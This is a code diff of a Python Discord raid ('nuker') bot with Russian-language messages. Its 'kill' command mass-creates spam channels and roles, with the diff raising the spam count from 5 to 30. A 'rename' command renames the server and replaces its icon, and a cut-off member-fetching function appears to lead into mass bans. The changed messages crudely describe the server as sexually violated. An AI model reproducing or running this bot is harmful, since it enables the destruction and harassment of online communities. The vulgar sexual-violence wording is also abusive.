@@ -24,12 +24,12 @@ async def sendch(ch,text,count):
     except: pass
 
 async def createchannel(ctx):
-    try: c = await ctx.guild.create_text_channel('crash-by-fastestnuker')
+    try: c = await ctx.guild.create_text_channel('краш от рейдбата')
     except: pass
-    else: create_task(sendch(ch=c,text=spamtext,count=5))
+    else: create_task(sendch(ch=c,text=spamtext,count=30))
 
 async def createrole(ctx):
-    try: await ctx.guild.create_role(name='Crashed By Fastest Nuker')
+    try: await ctx.guild.create_role(name='краш от рейдбата')
     except: pass
 
 @client.command()
@@ -45,15 +45,15 @@ async def kill(ctx):
     for _ in range(50):
         create_task(createchannel(ctx))
         create_task(createrole(ctx))
-    await ctx.author.send(f'Краш сервера `{ctx.guild}` (id: {ctx.guild.id}) завершен!')
+    await ctx.author.send(f'Изнасилование сервера `{ctx.guild}` (id: {ctx.guild.id}) некарасиком завершено!')
 
 @client.command()
 async def rename(ctx):
     await ctx.message.delete()
     with open('icon.PNG', 'rb') as f:
         icon = f.read()
-        await ctx.guild.edit(name='Crashed by Fastest Nuker', icon=icon)
-    await ctx.author.send(f'Сервер (id) {ctx.guild.id} был переименован, а так-же изменена ему иконка')
+        await ctx.guild.edit(name='Крашнуто рейдбатом', icon=icon)
+    await ctx.author.send(f'Сервер (id) {ctx.guild.id} был трахнут в очко и переименован.')
 
 async def banus(ctx, limit=None):
     fetched = ctx.guild.fetch_members(limit=limit)
